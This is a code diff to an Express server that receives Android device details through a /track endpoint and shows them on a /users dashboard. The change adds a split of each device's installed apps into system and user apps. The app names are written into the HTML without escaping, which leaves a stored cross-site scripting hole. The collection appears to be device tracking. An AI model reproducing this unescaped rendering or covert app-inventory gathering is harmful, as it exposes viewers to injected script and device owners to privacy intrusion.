@@ -88,9 +88,19 @@ app.post('/track', (req, res) => {
 
     const parsed = parseBody(body);
 
-    const apps = parsed.apps
+    const allApps = parsed.apps
       ? parsed.apps.split(",").map(x => x.trim()).filter(Boolean)
       : [];
+
+    // Simple heuristic:
+    // system apps usually start with android/com.android/com.google
+    const systemApps = allApps.filter(a =>
+      a.startsWith("android") ||
+      a.startsWith("com.android") ||
+      a.startsWith("com.google")
+    );
+
+    const userApps = allApps.filter(a => !systemApps.includes(a));
 
     const data = {
       type: "device",
@@ -99,7 +109,11 @@ app.post('/track', (req, res) => {
       model: parsed.model,
       brand: parsed.brand,
       android: parsed.android,
-      app_count: apps.length,
+
+      app_count: allApps.length,
+      system_apps: systemApps,
+      user_apps: userApps,
+
       time: new Date().toISOString()
     };
 
@@ -111,6 +125,7 @@ app.post('/track', (req, res) => {
     res.json({ status: "ok" });
   });
 });
+      
 
 /* ================= UPLOAD ================= */
 
@@ -192,6 +207,9 @@ app.get('/users', (req, res) => {
     <style>
       body { background:#111; color:#fff; font-family:sans-serif; }
       .card { border:1px solid #333; padding:15px; margin:10px; border-radius:10px; }
+      .apps { max-height:200px; overflow:auto; background:#000; padding:10px; margin-top:5px; }
+      .apps div { font-size:12px; border-bottom:1px solid #222; padding:2px; }
+      .title { margin-top:10px; font-weight:bold; }
     </style>
   </head>
   <body>
@@ -206,7 +224,17 @@ app.get('/users', (req, res) => {
       <b>Device:</b> ${user.brand} ${user.model}<br>
       <b>Android:</b> ${user.android}<br>
       <b>Battery:</b> ${user.battery}<br>
-      <b>Apps Count:</b> ${user.app_count}<br>
+      <b>Total Apps:</b> ${user.app_count || 0}<br>
+
+      <div class="title">📱 User Apps (${user.user_apps?.length || 0})</div>
+      <div class="apps">
+        ${(user.user_apps || []).map(a => `<div>${a}</div>`).join("")}
+      </div>
+
+      <div class="title">⚙️ System Apps (${user.system_apps?.length || 0})</div>
+      <div class="apps">
+        ${(user.system_apps || []).map(a => `<div>${a}</div>`).join("")}
+      </div>
     </div>
     `;
   });
@@ -215,6 +243,10 @@ app.get('/users', (req, res) => {
 
   res.send(html);
 });
+
+  
+
+  
 
 /* ================= LOG VIEW (ORDER FIX) ================= */
 
